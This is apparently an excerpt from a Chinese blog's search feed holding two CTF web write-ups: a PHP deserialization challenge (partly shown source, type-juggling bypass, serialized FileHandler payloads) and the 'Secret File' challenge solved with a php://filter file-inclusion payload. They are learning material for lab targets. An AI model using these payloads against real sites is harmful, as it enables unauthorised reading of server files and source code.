class="built_in">isset</span>($<span class="keyword">this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = <span class="built_in">file_get_contents</span>($<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        echo <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        echo $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="built_in">strlen</span>($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">ord</span>($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; <span class="built_in">ord</span>($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">is_valid</span>($str)) &#123;</span><br><span class="line">        $obj = <span class="built_in">unserialize</span>($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看不懂看不懂看不懂…直接看大佬总结出来的知识</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>PHP反序列化漏洞、弱类型比较。</p><p>经过分析，这个题目需要传入一个序列化之后的类对象，并且要绕过两层防护：</p><h2 id="两个防护："><a href="#两个防护：" class="headerlink" title="两个防护："></a>两个防护：</h2><h4 id="一：is-valid"><a href="#一：is-valid" class="headerlink" title="一：is_valid()"></a>一：is_valid()</h4><p>要求传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p><p><strong>绕过方法</strong>：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符。</p><h4 id="二：destruct-魔术方法"><a href="#二：destruct-魔术方法" class="headerlink" title="二：destruct()魔术方法"></a>二：destruct()魔术方法</h4><p>op===”2”，是强比较</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            $<span class="keyword">this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而在process()函数中,op==”2”是弱比较</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> function <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="keyword">this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>绕过方法</strong>：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$op=<span class="number">2</span>;</span><br><span class="line">$oop=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>($op===<span class="string">&quot;2&quot;</span>)</span><br><span class="line">echo <span class="string">&quot;数字2与字符2强比较成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">echo <span class="string">&quot;数字2与字符2强比较失败&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($op==<span class="string">&quot;2&quot;</span>)</span><br><span class="line"> echo <span class="string">&quot;数字2与字符2弱比较成功&quot;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">echo <span class="string">&quot;数字2与字符2弱比较失败&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）"><a href="#本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）" class="headerlink" title="本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）"></a>本地进行序列化操作（可在菜鸟工具里进行PHP在线测试）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span>  $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  $filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content = <span class="string">&quot;1&quot;</span>;        <span class="comment">//因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">FileHandler</span>();</span><br><span class="line">$b = <span class="built_in">serialize</span>($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>序列化结果：</strong></p><blockquote><p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}</p></blockquote><p><strong>payload：</strong></p><blockquote><p>/?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”1”;}</p></blockquote><p>f12查看源码，找到flag<br><img src="https://img-blog.csdnimg.cn/20210518175816476.png" alt="在这里插入图片描述"></p><h4 id="也可以使用伪协议"><a href="#也可以使用伪协议" class="headerlink" title="也可以使用伪协议"></a>也可以使用伪协议</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  $filename = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  $content = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">FileHandler</span>();</span><br><span class="line">$b = <span class="built_in">serialize</span>($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：</p><blockquote><p>/?str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;s:7:”content”;N;}</p></blockquote><p>得到一串base编码<br><img src="https://img-blog.csdnimg.cn/20210518180203370.png" alt="在这里插入图片描述">解码得到flag<br><img src="https://img-blog.csdnimg.cn/20210518180408894.png" alt="在这里插入图片描述"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>PHP反序列化漏洞和弱类型比较还是比较懵懂<br>路漫漫，加油学吧</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF[极客大挑战2019]Secret File</title>
      <link href="/posts/BUUCTF-Web-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/"/>
      <url>/posts/BUUCTF-Web-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DSecret%20File/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>朋友们好啊我是混元形意太极门掌门人马保国<br>刚才有个朋友发给我一个链接，我一看！嗷！原来是CTF题啊！他非要让我解解，我说可以。<br>诶…我啪的一下就进入了这个链接<br><img src="https://img-blog.csdnimg.cn/20201214221541596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>虽然我不想知道她的秘密啊…但是还是要不情愿的打开源页面查看源代码， 发现其中存在隐藏链接啊</p><p><img src="https://img-blog.csdnimg.cn/20201214221736450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶…接着不情愿的点击这个隐藏链接跳转页面<br><img src="https://img-blog.csdnimg.cn/2020121422193574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>嗷！再次不情愿的点击SECRET<br><img src="https://img-blog.csdnimg.cn/20201214222023826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>哈！不讲武德…没看清！？ 那就怪不得我马某人掏出burp抓包了！<br><img src="https://img-blog.csdnimg.cn/20201214223443846.png#pic_center" alt="在这里插入图片描述"><br>接着我以GET方式进入 action.php 得到一个秘密文件 secr3t.php<br>哼！年轻人！<br><img src="https://img-blog.csdnimg.cn/20201214222811694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我笑了一下进入这个秘密文件后出现以下界面啊<br><img src="https://img-blog.csdnimg.cn/20201214223835338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们试着以GET方式传入变量file，值为flag.php<br>啊…哈！骗！偷袭！很快嗷！发现看不到flag……<br><img src="https://img-blog.csdnimg.cn/20201214224246562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶…百度搜索PHP伪协议慢慢看一会儿…了解到这里应该需要结合php://filter协议流读取目标文件内容啊<br>嗷！就是在secr3t.php后面添加<br>？file=php://filter/read=convert.base64-encode/resource=flag.php<br>然后进行访问得到一串代码嗷<br><img src="https://img-blog.csdnimg.cn/20201214225106373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看出这里需要用到base64解码啊！<br>我一个闪电五连鞭!<br>解码成功得到flag!<br><img src="https://img-blog.csdnimg.cn/20201214225312155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>诶传统武术点到为止，他已经输了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
